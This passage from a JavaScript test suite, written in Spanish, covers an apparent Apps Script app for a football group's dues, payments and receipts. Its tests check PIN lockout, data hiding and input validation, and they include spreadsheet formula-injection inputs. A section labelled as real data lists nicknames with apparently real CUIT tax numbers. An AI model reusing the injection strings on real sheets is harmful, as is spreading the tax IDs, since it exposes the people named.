  const ad = e2.integrantes.find(i => i.apodo === 'Adelanta');
  check('cuota sube en diciembre: el adelantado debe la diferencia ($3.000)', ad.estados[2].e === 'debe' && ad.estados[2].falta === 3000 && ad.deuda === 3000, JSON.stringify(ad.estados.slice(0, 3)));
}

section('W1 app pública: datos calculados, sin información personal');
{
  const w = newWorld(basePayments());
  w.setNow(nowIso('2026-10-10 20:00'));
  let x = intentar(() => w.run('datosApp_'));
  check('datosApp_ no da error', !x.e, x.e && x.e.stack);
  const d = x.r;
  if (d) {
    const json = JSON.stringify(d);
    check('cancha del mes', d.cancha.costo === 120000 && d.cancha.recaudado === 75000 && d.cancha.pagaron === 5 && d.cancha.pagada, JSON.stringify(d.cancha));
    check('caja', d.caja.saldo === 75000 && d.caja.adelantos === 120000, JSON.stringify(d.caja));
    check('por integrante solo apodo, estados y cuotas que debe', d.integrantes.every(m => Object.keys(m).sort().join() === 'apodo,baja,cuotasDebe,estados,hasta'), JSON.stringify(d.integrantes[0]));
    check('sin CUIT, números de operación ni montos por persona', !/20-?30111222|20301112224|180000000\d+|182263652715|"deuda"|"adelantado"|"pagos"/.test(json), json.slice(0, 400));
    check('valores por mes', d.valores.length === 2 && d.valores[1].cuota === 15000 && d.valores[1].cancha === 150000, JSON.stringify(d.valores));
    check('gastos y cobrado por mes', d.gastos.length === 1 && d.gastos[0].monto === 120000 && d.porMes.length >= 1, JSON.stringify(d.gastos));
    check('queda en caché', !!(w.cache && w.cache.datosApp));
  }
  sync(w, '2026-10-10 21:00');
  check('la sincronización borra la caché', !(w.cache && w.cache.datosApp) && w.cacheRemoved > 0);
}

section('R1 recalcular: Valores, Cuotas y Resumen');
{
  const w = newWorld(basePayments());
  w.setNow(nowIso('2026-10-10 20:00'));
  const x = intentar(() => w.run('recalcular_'));
  check('recalcula sin error', !x.e, x.e && x.e.stack);
  const v = w.sheet('Valores');
  check('crea Valores con la cuota y la cancha de Config', v && v.getRange(2, 2).getValue() === 15000 && v.getRange(2, 3).getValue() === 120000 && v.getRange(3, 3).getValue() === 150000 && v.getRange(3, 2).getValue() === '');
  const c = w.sheet('Cuotas').rows(1);
  check('Cuotas: encabezado y estados', c[0][0] === 'Integrante' && c[0][5] === 'oct 26' && c[1][0] === 'Juancho' && c[1][5] === 'Pagado', JSON.stringify(c.slice(0, 2)));
  const r = w.sheet('Resumen').rows(1);
  const saldo = r.find(f => f[0] === 'Saldo en caja ($)');
  check('Resumen: saldo en caja', saldo && saldo[1] === '75000', JSON.stringify(saldo));
  check('Integrantes: columnas de alta y baja', w.sheet('Integrantes').getRange(1, 11).getValue() === 'Fecha de alta' && w.sheet('Integrantes').getRange(1, 12).getValue() === 'Último mes (baja)');
  check('Pagos: lista de imputaciones nueva', !!w.sheet('Pagos').raw(2, 4).validation);
}

section('R2 datos reales de la planilla (10/10/2026): mismos totales que las fórmulas viejas');
{
  const w = createWorld({ codePath: CODE, me: ME, payments: [], mp: {} });
  const F = s => ({ value: art(s.split('/').reverse().join('-') + ' 00:00'), fmt: 'dd/mm/yyyy' });
  const M = s => ({ value: art(s + '-01 00:00'), fmt: 'mmm yyyy' });
  const nombres = [['Gustavo', '20296214745'], ['Franco', '20421880892'], ['Pela', '23270425429'], ['Renzo', '20346572834'], ['Lucio', ''],
    ['Cristian', '20399566208'], ['Alfredo', ''], ['Robert', '20297403983'], ['Mono', '20270431926'], ['Diego', '23343291949'],
    ['Emiliano', '20412532458'], ['Lokillo', '20229418700'], ['Richard', ''], ['Ariel', '20296212882'], ['Sebas P', ''], ['Johaquin', ''],
    ['Joaquin', ''], ['Cascini', ''], ['Pablo', '20411574130']];
  w.addSheet('Integrantes', [['N°', 'Apodo', 'Nombre', 'Apellido', 'Nombre MP', 'CUIT/CUIL', 'CVU/CBU', 'Notas', 'Cuota automática', 'ID Mercado Pago']]
    .concat(nombres.map(([a, c], i) => [String(i + 1), a, a, '', '', c, '', '', a === 'Lucio' ? 'Sí' : 'No', ''])), 10);
  const pagos = [['02/10/2026', 'Robert', 45000, 'Cuota'], ['06/10/2026', 'Lokillo', 30000, 'Cuota'], ['07/10/2026', 'Emiliano', 15000, 'Cuota'],
    ['09/10/2026', 'Pela', 15000, 'Cuota'], ['09/10/2026', 'Mono', 15000, 'Cuota'], ['09/10/2026', 'Gustavo', 15000, 'Cuota'],
    ['09/10/2026', 'Renzo', 15000, 'Cuota'], ['09/10/2026', 'Pablo', 15000, 'Cuota'], ['09/10/2026', 'Ariel', 15000, 'Cuota'],
    ['09/10/2026', 'Diego', 15000, 'Cuota'], ['09/10/2026', 'Pela', 6000, 'Deuda anterior'], ['01/10/2026', 'Franco', 15000, 'Cuota'],
    ['01/10/2026', 'Cristian', 15000, 'Cuota']];
  w.addSheet('Pagos', [['Fecha', 'Integrante', 'Monto', 'Imputación', 'Medio', 'Nombre', 'CUIT', 'CVU', 'Op', 'Notas']]
    .concat(pagos.map(([f, a, m, i], k) => [F(f), a, m, i, 'Transferencia Mercado Pago', '', '', '', String(180000000000 + k), ''])), 11);
  w.addSheet('Gastos', [['Fecha', 'Tipo', 'Concepto', 'Monto', 'Sale de', 'Destinatario', 'Op', 'Notas'],
    [F('09/10/2026'), 'Cancha', 'Cancha octubre', 200000, 'Cuotas del mes', 'Club Social y Deportivo Aberastain', '182263652715', '']], 10);
  const cfg = [];
  for (let r = 1; r <= 36; r++) cfg.push(['', '']);
  cfg[3] = ['Cuota mensual ($)', 15000]; cfg[4] = ['Inicio del control (mes)', M('2026-10')]; cfg[5] = ['Saldo inicial', 21000];
  cfg[6] = ['Alias', 'luciopepi']; cfg[9] = ['Día de vencimiento', 10];
  cfg[15] = [M('2026-10'), 200000]; cfg[16] = [M('2026-11'), 250000];
  cfg[32] = ['Importar pagos desde', F('10/10/2026')];
  w.addSheet('Config', cfg, 5);
  w.addSheet('Cuotas', [['Integrante']], 20);
  w.addSheet('Resumen', [['Caja']]);
  w.setNow(nowIso('2026-10-10 20:00'));
  const x = intentar(() => w.run('datosApp_'));
  check('calcula con los datos reales', !x.e, x.e && x.e.stack);
  const d = x.r;
  if (d) {
    check('cancha: $195.000 de $200.000, 13 de 19, faltan $5.000', d.cancha.recaudado === 195000 && d.cancha.costo === 200000 && d.cancha.pagaron === 13 && d.cancha.total === 19 && d.cancha.faltan === 5000, JSON.stringify(d.cancha));
    check('caja: saldo $67.000, adelantos $45.000, fondo $22.000', d.caja.saldo === 67000 && d.caja.adelantos === 45000 && d.caja.fondo === 22000 && d.caja.cobrado === 246000, JSON.stringify(d.caja));
    const deben = d.integrantes.filter(m => m.cuotasDebe > 0).map(m => m.apodo).join(',');
    check('deben: Alfredo, Richard, Sebas P, Johaquin, Joaquin y Cascini', deben === 'Alfredo,Richard,Sebas P,Johaquin,Joaquin,Cascini', deben);
    const rob = d.integrantes.find(m => m.apodo === 'Robert');
    check('Robert pagado hasta diciembre', rob.hasta === 'diciembre 2026', rob.hasta);
    check('valores: oct $15.000/$200.000, nov $250.000', d.valores[0].cuota === 15000 && d.valores[0].cancha === 200000 && d.valores[1].cancha === 250000, JSON.stringify(d.valores));
  }
}

section('A1 PIN del administrador');
{
  const w = newWorld(basePayments(), { ui: uiPin(PIN) });
  w.setNow(nowIso('2026-10-10 20:00'));
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  check('sin PIN definido: pide definirlo', x.e && /Todavía no hay PIN/.test(x.e.message), x.e && x.e.message);
  w.run('definirPin');
  check('PIN guardado como hash con sal', /^[0-9a-f-]{36}:[A-Za-z0-9+/=]{44}$/.test(w.scriptProps.ADMIN_PIN || '') && !String(w.scriptProps.ADMIN_PIN).includes(PIN));
  x = intentar(() => w.ctx.adminEntrar(PIN));
  check('PIN correcto entra', !x.e && x.r.integrantes.length === 5 && x.r.cuotaMes === 15000, x.e && x.e.stack);
  check('el panel no manda CUIT ni IDs', x.r && !/20301112224|20-30111222/.test(JSON.stringify(x.r)));
  for (let i = 0; i < 5; i++) x = intentar(() => w.ctx.adminEntrar('000000'));
  check('PIN incorrecto', x.e && /PIN incorrecto/.test(x.e.message));
  x = intentar(() => w.ctx.adminEntrar(PIN));
  check('después de 5 errores bloquea', x.e && /Demasiados intentos/.test(x.e.message));
  x = intentar(() => w.ctx.adminCargarPago(PIN, { apodo: 'Colo', monto: 15000, fecha: '2026-10-10', tipo: 'Cuota' }));
  check('el bloqueo frena las escrituras', x.e && /Demasiados intentos/.test(x.e.message));
}

section('A2 cargar efectivo');
{
  const w = mundoAdmin();
  const antes = rowsOf(w, 'Pagos').length;
  let x = intentar(() => w.ctx.adminCargarPago(PIN, { apodo: 'Colo', monto: '15000', fecha: '2026-10-10', tipo: 'Cuota', nota: '=HYPERLINK("x")' }));
  check('carga sin error', !x.e, x.e && x.e.stack);
  const ult = rowsOf(w, 'Pagos').slice(-1)[0] || [];
  check('fila: integrante, monto, Cuota, Efectivo', ult[1] === 'Colo' && ult[2] === '15000' && ult[3] === 'Cuota' && ult[4] === 'Efectivo', JSON.stringify(ult));
  check('nota sin fórmula y en azul', /^Cargado desde la app\. =HYPERLINK/.test(ult[9]) && w.formulas.length === 0 && w.sheet('Pagos').raw(antes + 2, 2).color === '#0000FF');
  check('devuelve datos públicos y del panel', x.r && x.r.datos && x.r.admin && /Colo/.test(x.r.mensaje));
  const saldo = x.r.datos.caja.saldo;
  x = intentar(() => w.ctx.adminCargarPago(PIN, { apodo: 'Tano', monto: '8500', fecha: '2026-10-10', tipo: 'No es de la caja' }));
  check('"No es de la caja" no cambia el saldo', !x.e && x.r.datos.caja.saldo === saldo, x.e ? x.e.message : x.r.datos.caja.saldo + ' vs ' + saldo);
  x = intentar(() => w.ctx.adminCargarPago(PIN, { apodo: 'Tano', monto: '8500', fecha: '2026-10-10', tipo: 'No es de la caja' }));
  check('doble toque: no carga dos veces', x.e && /ya se cargó/.test(x.e.message));
  const malos = [
    [{ apodo: 'Nadie', monto: 15000, fecha: '2026-10-10', tipo: 'Cuota' }, /integrante/],
    [{ apodo: 'Tano', monto: 0, fecha: '2026-10-10', tipo: 'Cuota' }, /monto/],
    [{ apodo: 'Tano', monto: 15000, fecha: '2026-10-12', tipo: 'Cuota' }, /fecha/],
    [{ apodo: 'Tano', monto: 15000, fecha: '2026-10-09', tipo: 'Revisar' }, /cuota, otra cosa/],
  ];
  check('valida integrante, monto, fecha y tipo', malos.every(([d, re]) => { const y = intentar(() => w.ctx.adminCargarPago(PIN, d)); return y.e && re.test(y.e.message); }));
}

section('A3 asignar y descartar transferencias de Por revisar');
{
  const RICARDO = 444000555;
  const w = mundoAdmin(basePayments().concat([
    pay({ id: 7101, created: '2026-10-10 10:00', payerId: RICARDO, cuit: '20111222333', amount: 15000, first: 'Ricardo', last: 'Pereyra' }),
    pay({ id: 7102, created: '2026-10-10 11:00', payerId: RICARDO, cuit: '20111222333', amount: 30000, first: 'Ricardo', last: 'Pereyra' }),
    pay({ id: 7103, created: '2026-10-10 12:00', payerId: ME, amount: 15000, ptype: 'bank_transfer', pmethod: 'cvu', bankName: 'Fulano Banco' }),
    pay({ id: 7104, created: '2026-10-10 12:30', payerId: 444000999, cuit: '20555666777', amount: 15000, first: 'Asado' }),
  ]));
  let err = sync(w, '2026-10-10 15:00');
  check('sync sin error', !err, err && err.stack);
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  check('el panel lista las 4 sin CUIT ni ID', !x.e && x.r.porRevisar.length === 4 && !/20111222333|444000555/.test(JSON.stringify(x.r)));
  check('marca la del banco', x.r.porRevisar.some(t => t.op === '7103' && t.banco));
  x = intentar(() => w.ctx.adminAsignar(PIN, '7101', 'Colo'));
  check('asigna sin error', !x.e, x.e && x.e.stack);
  const deColo = rowsOf(w, 'Pagos').filter(r => r[1] === 'Colo' && ['7101', '7102'].includes(r[8]));
  check('pasa las 2 de esa cuenta a Pagos como Cuota', deColo.length === 2 && deColo.every(r => r[3] === 'Cuota'), JSON.stringify(deColo));
  const colo = w.sheet('Integrantes').rows(2).find(r => r[1] === 'Colo');
  check('guarda CUIT e ID en Integrantes', colo[5] === '20111222333' && colo[9] === String(RICARDO), JSON.stringify(colo));
  w.payments.push(pay({ id: 7105, created: '2026-10-11 09:00', payerId: RICARDO, cuit: '20111222333', amount: 15000 }));
  err = sync(w, '2026-10-11 10:00');
  check('la siguiente de esa cuenta entra sola', !err && rowsOf(w, 'Pagos').some(r => r[8] === '7105' && r[1] === 'Colo'));
  x = intentar(() => w.ctx.adminAsignar(PIN, '7103', 'Tano'));
  check('banco: se asigna y avisa', !x.e && rowsOf(w, 'Pagos').some(r => r[8] === '7103' && r[1] === 'Tano' && r[4] === 'Transferencia bancaria') && /bancos/.test(x.r.mensaje), x.e ? x.e.message : x.r.mensaje);
  x = intentar(() => w.ctx.adminDescartar(PIN, '7104'));
  check('"no es de la caja": sale de Por revisar y no va a Pagos', !x.e && revisar(w).length === 0 && !rowsOf(w, 'Pagos').some(r => r[8] === '7104'), x.e && x.e.message);
  err = sync(w, '2026-10-11 11:00');
  check('la descartada no vuelve a aparecer', !err && revisar(w).length === 0);
  x = intentar(() => w.ctx.adminAsignar(PIN, '7103', 'Tano'));
  check('asignar una que ya no está da error claro', x.e && /ya no está/.test(x.e.message));
}

section('A4 varios CUIT por integrante; no se pisa el de otro');
{
  const w = mundoAdmin(basePayments().concat([
    pay({ id: 7201, created: '2026-10-10 10:00', payerId: 444000777, cuit: '27999888777', amount: 15000 }),
  ]));
  w.sheet('Integrantes').getRange('F5').setValue('27999888777, 20999000111');
  let err = sync(w, '2026-10-10 15:00');
  check('reconoce el segundo CUIT de la celda', !err && rowsOf(w, 'Pagos').some(r => r[8] === '7201' && r[1] === 'Colo'), err && err.stack);
  w.payments.push(pay({ id: 7203, created: '2026-10-10 16:30', payerId: 444000999, cuit: '27000111222', amount: 15000 }));
  sync(w, '2026-10-10 17:00');
  w.sheet('Integrantes').getRange('F4').setValue('27000111222');
  const x = intentar(() => w.ctx.adminAsignar(PIN, '7203', 'Juancho'));
  const juancho = w.sheet('Integrantes').rows(2).find(r => r[1] === 'Juancho');
  check('asigna, sin copiar a Juancho un CUIT de Tano', !x.e && !String(juancho[5]).includes('27000111222'), x.e ? x.e.message : JSON.stringify(juancho));
}

section('A5 alta de integrante (media cuota después del 15)');
{
  const w = mundoAdmin();
  let x = intentar(() => w.ctx.adminAgregarIntegrante(PIN, { apodo: 'Nico', nombre: 'Nicolás', apellido: 'Paz', cuit: '20-33444555-6', alta: '2026-10-20' }));
  check('agrega sin error', !x.e, x.e && x.e.stack);
  const nico = w.sheet('Integrantes').rows(2).slice(-1)[0];
  check('fila nueva con CUIT, No y fecha de alta', nico[1] === 'Nico' && nico[5] === '20334445556' && nico[8] === 'No' && /^20\/10\/2026/.test(nico[10]), JSON.stringify(nico));
  check('mensaje: media cuota en octubre', /octubre 2026 paga media cuota/.test(x.r.mensaje), x.r && x.r.mensaje);
  const n = x.r.datos.integrantes.find(m => m.apodo === 'Nico');
  check('en la app: octubre media cuota, debe', n && n.estados[0].medio && n.estados[0].e === 'debe', JSON.stringify(n));
  const malos = [
    [{ apodo: 'nico', alta: '2026-10-10' }, /Ya hay/],
    [{ apodo: '=1+1', alta: '2026-10-10' }, /apodo/],
    [{ apodo: 'Pepe', cuit: '123', alta: '2026-10-10' }, /11 números/],
    [{ apodo: 'Pepe', cuit: '20334445556', alta: '2026-10-10' }, /Nico/],
    [{ apodo: 'Pepe', alta: 'mañana' }, /fecha/],
  ];
  check('valida apodo, CUIT y fecha', malos.every(([d, re]) => { const y = intentar(() => w.ctx.adminAgregarIntegrante(PIN, d)); return y.e && re.test(y.e.message); }));
}

section('A6 baja y vuelta');
{
  const w = mundoAdmin();
  let x = intentar(() => w.ctx.adminBaja(PIN, 'Colo', '2026-10'));
  check('baja sin error', !x.e, x.e && x.e.stack);
  const colo = x.r.datos.integrantes.find(m => m.apodo === 'Colo');
  check('desde noviembre "no juega"', colo && colo.estados[1].e === 'nojuega' && colo.baja, JSON.stringify(colo && colo.estados.slice(0, 2)));
  x = intentar(() => w.ctx.adminBaja(PIN, 'Colo', ''));
  const colo2 = x.r && x.r.datos.integrantes.find(m => m.apodo === 'Colo');
  check('deshacer la baja', !x.e && colo2 && !colo2.baja && colo2.estados[1].e !== 'nojuega');
}

section('A7 clasificar pagos que no son múltiplo de la cuota');
{
  const w = mundoAdmin(basePayments().concat([
    pay({ id: 7301, created: '2026-10-10 10:00', payerId: 444000001, cuit: '20301112223', amount: 21000 }),
  ]));
  sync(w, '2026-10-10 15:00');
  let x = intentar(() => w.ctx.adminEntrar(PIN));
  const p = x.r && x.r.porClasificar[0];
  check('aparece en "Por clasificar"', p && p.apodo === 'Juancho' && p.monto === 21000, JSON.stringify(x.r && x.r.porClasificar));
  const saldo = w.run('datosApp_').caja.saldo;
  x = intentar(() => w.ctx.adminClasificar(PIN, p.fila, 'Cuota', { apodo: 'Juancho', monto: 999 }));
  check('si la fila cambió, no toca nada', x.e && /cambió/.test(x.e.message));
  x = intentar(() => w.ctx.adminClasificar(PIN, p.fila, 'Cuota', { apodo: 'Juancho', monto: 21000 }));
  check('clasifica como Cuota y suma a la caja', !x.e && rowsOf(w, 'Pagos').some(r => r[8] === '7301' && r[3] === 'Cuota') && x.r.datos.caja.saldo === saldo + 21000, x.e ? x.e.message : x.r.datos.caja.saldo + ' vs ' + saldo);
  x = intentar(() => w.ctx.adminClasificar(PIN, p.fila, 'Por clasificar', { apodo: 'Juancho', monto: 21000 }));
  check('no acepta opciones inválidas', x.e && /válida/.test(x.e.message));
}

section('A8 valores con "vigente desde"');
{
  const w = mundoAdmin();
  let x = intentar(() => w.ctx.adminSimularValor(PIN, { tipo: 'cuota', monto: '18000', desde: '2026-12' }));
  check('simula sin error', !x.e, x.e && x.e.stack);
  check('avisa a quienes tienen diciembre pagado (Juancho, Flaco, Tano)', x.r && ['Juancho', 'Flaco', 'Tano'].every(a => x.r.afectados.some(y => y.apodo === a && y.diferencia === 3000)) && !x.r.afectados.some(y => y.apodo === 'Colo'), JSON.stringify(x.r && x.r.afectados));
  check('cuotas necesarias desde diciembre', x.r && x.r.necesarios === Math.ceil(150000 / 18000));
  x = intentar(() => w.ctx.adminNuevoValor(PIN, { tipo: 'cuota', monto: '18000', desde: '2026-12' }));
  check('guarda en Valores', !x.e && w.sheet('Valores').rows(2).length === 3 && w.sheet('Valores').getRange(4, 2).getValue() === 18000, x.e ? x.e.stack : JSON.stringify(w.sheet('Valores').rows(2)));
  x = intentar(() => w.ctx.adminNuevoValor(PIN, { tipo: 'cancha', monto: '160000', desde: '2026-12' }));
  check('el mismo mes se completa en la misma fila', !x.e && w.sheet('Valores').rows(2).length === 3 && w.sheet('Valores').getRange(4, 3).getValue() === 160000);
  x = intentar(() => w.ctx.adminNuevoValor(PIN, { tipo: 'cuota', monto: '18000', desde: '2025-01' }));
  check('no acepta meses antes del inicio', x.e && /inicio/.test(x.e.message));
}

section('A9 gastos con comprobante');
{
  const nums = intentar(() => newWorld([]).ctx.numerosOperacion_('Comprobante\nNúmero de operación: 1832 7839 1082\nCUIT 20301112224\nCVU 0000003100044256946246'));
  check('lee el N° de operación y salta el CUIT', nums.r && nums.r[0] === '183278391082' && !nums.r.includes('20301112224'), JSON.stringify(nums.r));
  const w = mundoAdmin(basePayments().concat([
    pay({ id: 555100001, created: '2026-10-09 10:00', payerId: ME, collector: 999000111, amount: 48000, desc: 'Bochas' }),
    pay({ id: 555100002, created: '2026-10-09 11:00', payerId: 444000001, cuit: '20301112223', amount: 15000 }),
  ]));
  let x = intentar(() => w.ctx.adminBuscarOperacion(PIN, '555100001'));
  check('busca una operación tuya', !x.e && x.r.pago.monto === 48000 && /09\/10\/2026/.test(x.r.pago.fecha), x.e && x.e.stack);
  x = intentar(() => w.ctx.adminBuscarOperacion(PIN, '555100002'));
  check('un cobro no es un gasto', x.e && /cobro/.test(x.e.message));
  w.ocrTexto = 'Mercado Pago\nTransferencia enviada\nNúmero de operación 555100001';
  x = intentar(() => w.ctx.adminLeerComprobante(PIN, { datos: Buffer.from('imagen').toString('base64'), tipo: 'image/jpeg' }));
  check('lee el comprobante y encuentra la operación', !x.e && x.r.op === '555100001' && x.r.pago.monto === 48000 && x.r.archivoId, x.e && x.e.stack);
  const D = w.drive || { calls: [], files: {} };
  check('guarda la imagen en la carpeta y borra el documento de OCR', D.calls.some(c => /post .*drive\/v3\/files$/.test(c)) && Object.values(D.files).some(f => f.parents) && !Object.values(D.files).some(f => f.ocr), JSON.stringify(D));
  x = intentar(() => w.ctx.adminLeerComprobante(PIN, { datos: 'x', tipo: 'application/pdf' }));
  check('solo imágenes', x.e && /imagen/.test(x.e.message));
  x = intentar(() => w.ctx.adminGuardarGasto(PIN, { op: '555100001', tipo: 'Equipamiento', concepto: 'Bochas nuevas', archivoId: 'arch2abcdefghij' }));
  check('guarda el gasto con monto de Mercado Pago', !x.e && rowsOf(w, 'Gastos').some(r => r[6] === '555100001' && r[3] === '48000' && r[1] === 'Equipamiento' && /drive\.google\.com/.test(r[7])), x.e ? x.e.stack : JSON.stringify(rowsOf(w, 'Gastos')));
  check('aparece en la app', x.r && x.r.datos.gastos.some(g => g.concepto === 'Bochas nuevas' && g.monto === 48000));
  x = intentar(() => w.ctx.adminGuardarGasto(PIN, { op: '555100001', tipo: 'Equipamiento', concepto: 'Otra vez' }));
  check('no se carga dos veces', x.e && /ya está cargada/.test(x.e.message));
}

section('F1 correcciones de la revisión');
{
  // baja con adelanto: lo que ya no se usa queda libre en la caja
  const w = newWorld([]);
  const D = s => w.mkDate(art(s + ' 00:00').getTime());
  const base = {
    inicio: D('2026-10-01'), saldoInicial: 0, hoy: D('2026-11-05'),
    valores: [{ desde: D('2026-10-01'), cuota: 15000, cancha: 200000 }],
    miembros: [{ apodo: 'Se va', cuits: [], ids: [], ultimoMes: D('2026-10-01') }, { apodo: 'Sigue', cuits: [], ids: [] }],
    pagos: [{ fecha: D('2026-10-05'), apodo: 'Se va', monto: 45000, imputacion: 'Cuota' },
      { fecha: D('2026-10-05'), apodo: 'Sigue', monto: 60000, imputacion: 'Cuota' }],
    gastos: [],
  };
  const e = w.ctx.calcularEstado_(base);
  const seVa = e.integrantes[0], sigue = e.integrantes[1];
  check('baja: lo pagado de más no queda como adelanto', seVa.adelantado === 0 && seVa.deuda === 0, JSON.stringify({ a: seVa.adelantado, d: seVa.deuda }));
  check('activo: el adelanto sigue contando', sigue.adelantado === 30000);
  check('fondo: incluye lo que dejó el que se fue', e.caja.fondo === 105000 - 30000 - 200000, String(e.caja.fondo));

  // simulación: todos los meses adelantados desde "vigente desde"
  const wa = mundoAdmin(basePayments().concat([
    pay({ id: 7601, created: '2026-10-10 10:00', payerId: 444000001, cuit: '20301112223', amount: 30000 }),
  ]));
  sync(wa, '2026-10-10 15:00');
  const x = intentar(() => wa.ctx.adminSimularValor(PIN, { tipo: 'cuota', monto: '18000', desde: '2026-12' }));
  const j = x.r && x.r.afectados.find(a => a.apodo === 'Juancho');
  check('Juancho pagó hasta febrero: debe dic, ene y feb a $3.000', j && j.diferencia === 9000, JSON.stringify(x.r ? x.r.afectados : x.e.message));

  // público: sin CVU en el destinatario
  const wp = newWorld(basePayments());
  wp.setNow(nowIso('2026-10-10 20:00'));
  wp.sheet('Gastos').getRange(2, 6).setValue('Club Social y Deportivo Aberastain (CVU 0000003100086841610242)');
  const dp = wp.run('datosApp_');
  check('público: destinatario sin CVU', dp.gastos[0].destinatario === 'Club Social y Deportivo Aberastain', dp.gastos[0].destinatario);
  check('sinCuentas_: CBU, alias y números largos', wp.ctx.sinCuentas_('Deportes Sur CBU 0720179688000037080240 alias pago.sur') === 'Deportes Sur', wp.ctx.sinCuentas_('Deportes Sur CBU 0720179688000037080240 alias pago.sur'));

  // sincronizar desde la app: no corre
  const ws = newWorld(basePayments());
  ws.setNow(nowIso('2026-10-12 15:00'));
  ws.triggers.push({ h: 'sincronizar', uid: 'disparador-real' });
  let y = intentar(() => ws.ctx.sincronizar());
  check('sin disparador: no sincroniza', y.e && /corre sola/.test(y.e.message) && !ws.fetches.length);
  y = intentar(() => ws.ctx.sincronizar({ triggerUid: 'inventado' }));
  check('con un disparador inventado: no sincroniza', y.e && !ws.fetches.length);
  y = intentar(() => ws.ctx.sincronizar({ triggerUid: 'disparador-real' }));
  check('con el disparador del proyecto: sincroniza', !y.e && ws.fetches.length > 0, y.e && y.e.message);
}

section('F2 celular recordado: el PIN bloqueado no deja afuera al administrador');
{
  const w = mundoAdmin();
  let x = intentar(() => w.ctx.adminEntrar(PIN, true));
  const token = x.r && x.r.token;
  check('entrar recordando devuelve un código, no el PIN', /^t:[0-9a-f]{64}$/.test(token || '') && token.indexOf(PIN) === -1, token);
  check('se guarda solo el hash del código', !String(w.scriptProps.ADMIN_CELULARES).includes(token.slice(2)));
  for (let i = 0; i < 6; i++) intentar(() => w.ctx.adminEntrar('000000'));
  x = intentar(() => w.ctx.adminEntrar(PIN));
  check('el PIN queda bloqueado', x.e && /Demasiados intentos/.test(x.e.message));
  x = intentar(() => w.ctx.adminCargarPago(token, { apodo: 'Colo', monto: 15000, fecha: '2026-10-10', tipo: 'Cuota' }));
  check('el celular recordado sigue funcionando', !x.e, x.e && x.e.message);
  w.setNow(nowIso('2026-10-10 20:16'));
  x = intentar(() => w.ctx.adminEntrar(PIN));
  check('después de 15 minutos el PIN vuelve a andar', !x.e, x.e && x.e.message);
  w.ctx.adminSalir(token);
  x = intentar(() => w.ctx.adminEntrar(token));
  check('"Salir" invalida el código', x.e && /PIN incorrecto/.test(x.e.message));
  const t2 = w.ctx.adminEntrar(PIN, true).token;
  w.run('definirPin');
  x = intentar(() => w.ctx.adminEntrar(t2));
  check('un PIN nuevo invalida los celulares recordados', x.e && /PIN incorrecto/.test(x.e.message));
}

section('F3 comprobantes: errores de Mercado Pago y carpeta borrada');
{
  const w = mundoAdmin(basePayments());
  w.ocrTexto = 'Número de operación 999888777666';
  w.scriptProps.CARPETA_COMPROBANTES = 'carpeta-borrada';
  const x = intentar(() => w.ctx.adminLeerComprobante(PIN, { datos: Buffer.from('img').toString('base64'), tipo: 'image/jpeg' }));
  check('operación inexistente: devuelve el archivo y un aviso', !x.e && x.r.op === null && x.r.archivoId, x.e && x.e.stack);
  check('carpeta borrada: crea otra', w.scriptProps.CARPETA_COMPROBANTES !== 'carpeta-borrada' && /^carpeta/.test(w.scriptProps.CARPETA_COMPROBANTES), w.scriptProps.CARPETA_COMPROBANTES);
}

section('F4 formatos de Cuotas y Resumen');
{
  const w = newWorld(basePayments());
  w.setNow(nowIso('2026-10-10 20:00'));
  w.run('recalcular_');
  const c = w.sheet('Cuotas');
  check('Cuotas: meses y "Pagado hasta" como texto', c.raw(1, 6).fmt === '@' && c.raw(2, 5).fmt === '@', c.raw(1, 6).fmt + ' ' + c.raw(2, 5).fmt);
  const r = w.sheet('Resumen');
  const fila = r.rows(1).findIndex(f => f[0] === 'Integrantes con deuda') + 1;
  check('Resumen: cantidades sin formato de plata', r.raw(fila, 2).fmt === '0', r.raw(fila, 2).fmt);
}

section('A10 funciones del menú no se pueden usar desde la app');
{
  const w = newWorld(basePayments());
  w.triggers.push({ h: 'sincronizar' });
  const intentos = ['desactivarSincronizacion', 'activarSincronizacion', 'sincronizarAhora', 'probarConexion', 'definirPin', 'guardarClave', 'recalcularAhora']
    .map(f => intentar(() => w.ctx[f]()));
  check('sin la planilla abierta, todas cortan', intentos.every(x => x.e && /getUi/.test(x.e.message)), intentos.map(x => x.e && x.e.message).join(' | '));
  check('el disparador sigue activo', w.triggers.length === 1);
}

section('B1 pagos: anular, restaurar y corregir desde el panel');
{
  const w = mundoAdmin(basePayments().concat([pay({ id: 7401, created: '2026-10-10 18:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 })]));
  sync(w, '2026-10-10 19:00');
  const adel = r => r.admin.integrantes.find(m => m.apodo === 'Colo').adelantado;
  let x = intentar(() => w.ctx.adminCargarPago(PIN, { apodo: 'Colo', monto: '1', fecha: '2026-10-10', tipo: 'Cuota' }));
  const fila = w.sheet('Pagos').getLastRow();
  const antes = adel(x.r);
  const p = x.r.admin.pagos.find(q => q.fila === fila);
  check('el panel lista el pago de prueba, editable', p && p.monto === 1 && !p.bloqueado && p.imputacion === 'Cuota' && p.iso === '2026-10-10', JSON.stringify(p));
  x = intentar(() => w.ctx.adminAnularPago(PIN, fila, { apodo: 'Colo', monto: 1 }));
  check('anula sin error', !x.e, x.e && x.e.stack);
  const f1 = w.sheet('Pagos').rows(fila)[0];
  check('queda en la planilla: Anulado, tachado y con nota', f1[3] === 'Anulado' && w.sheet('Pagos').raw(fila, 1).line === 'line-through' && /Anulado \(era Cuota\)/.test(f1[9]), JSON.stringify(f1));
  check('deja de sumar', adel(x.r) === antes - 1, adel(x.r) + ' vs ' + antes);
  x = intentar(() => w.ctx.adminAnularPago(PIN, fila, { apodo: 'Colo', monto: 1 }));
  check('anular dos veces: error claro', x.e && /ya está anulado/.test(x.e.message));
  x = intentar(() => w.ctx.adminEditarPago(PIN, fila, { apodo: 'Colo', monto: 1 }, { apodo: 'Colo', monto: '15000', fecha: '2026-10-09', imputacion: 'Cuota', nota: 'era de 15.000' }));
  check('restaura corrigiendo monto y fecha', !x.e, x.e && x.e.stack);
  const f2 = w.sheet('Pagos').rows(fila)[0];
  check('fila restaurada: monto, fecha, Cuota, sin tachar y nota con el cambio', f2[2] === '15000' && f2[0] === '09/10/2026' && f2[3] === 'Cuota' &&
    w.sheet('Pagos').raw(fila, 1).line === 'none' && /restaurado como Cuota/.test(f2[9]) && /monto \$1 → \$15\.000/.test(f2[9]) && /Nota: era de 15\.000/.test(f2[9]), JSON.stringify(f2));
